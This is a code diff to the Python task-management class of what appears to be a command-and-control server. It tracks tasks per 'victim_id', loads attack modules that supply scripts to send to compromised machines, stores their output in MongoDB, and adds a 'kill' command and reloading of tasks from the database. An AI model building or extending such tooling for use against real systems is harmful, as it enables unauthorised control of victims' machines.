@@ -69,26 +69,31 @@ class Task:
 
 	## Creates an object of the respective Module Class, loads in dict and returns needed info to be sent by server
 	def issue_dict(self):
-		language = self.language
-		utility = self.utility
+		if self.command == 'kill':
+			self.issued = True
+			self.update_task_to_db('issued')
+			return {}
+		else:
+			language = self.language
+			utility = self.utility
 
-		module_folder = os.path.join(str(pathlib.Path(__file__).parent.resolve()), "../modules",utility)
+			module_folder = os.path.join(str(pathlib.Path(__file__).parent.resolve()), "../modules",utility)
 
-		sys.path.append(module_folder)
-		mod = __import__(self.command)
-		
-		## capitalize the first letter
-		module_name = self.command.title()
-		
-		## Needed module object is made here to be issued
-		module_obj = getattr(mod,module_name)(name=self.command,utility = utility, language=language,options=self.options)
-		
-		## Storing the mapping to access later
-		Module.module_task_id[self.task_id] = module_obj
+			sys.path.append(module_folder)
+			mod = __import__(self.command)
+			
+			## capitalize the first letter
+			module_name = self.command.title()
+			
+			## Needed module object is made here to be issued
+			module_obj = getattr(mod,module_name)(name=self.command,utility = utility, language=language,options=self.options)
+			
+			## Storing the mapping to access later
+			Module.module_task_id[self.task_id] = module_obj
 
-		self.issued = True
-		self.update_task_to_db('issued')
-		return {'task_id': self.task_id, 'language': language, 'command': self.command, 'script': module_obj.script}
+			self.issued = True
+			self.update_task_to_db('issued')
+			return {'task_id': self.task_id, 'language': language, 'command': self.command, 'script': module_obj.script}
 
 	## Insert the command output in the Database
 	def insert_cmd_output(self,output):
@@ -110,3 +115,20 @@ class Task:
 		h = {'task_id': self.task_id,'victim_id': self.victim_id, 'command':self.command, 'language':self.language, 'utility': self.utility, 'options':self.options, 'output':self.output ,'issued': self.issued}
 
 		tasks.insert_one(h)
+
+	## This will load the tasks info present in DB.
+	@classmethod
+	def load_tasks_from_db(cls):
+
+		mydb = cls.mongoclient[cls.databasename]
+		tasks = mydb["tasks"]
+
+		task_list = tasks.find()
+
+		for task in task_list:
+			if (task['task_id'] not in Task.tasks.keys()):
+				task_obj = Task(victim_id = task['victim_id'] ,command = task['command'], utility= task['utility'], language=task['language'],options = task['options'], task_id = task['task_id'], output = task['output'],issued = task['issued'],add_db = False)
+				cls.tasks[task['task_id']] = task_obj
+			else:
+				## Not sure if there will be such condition ?
+				pass
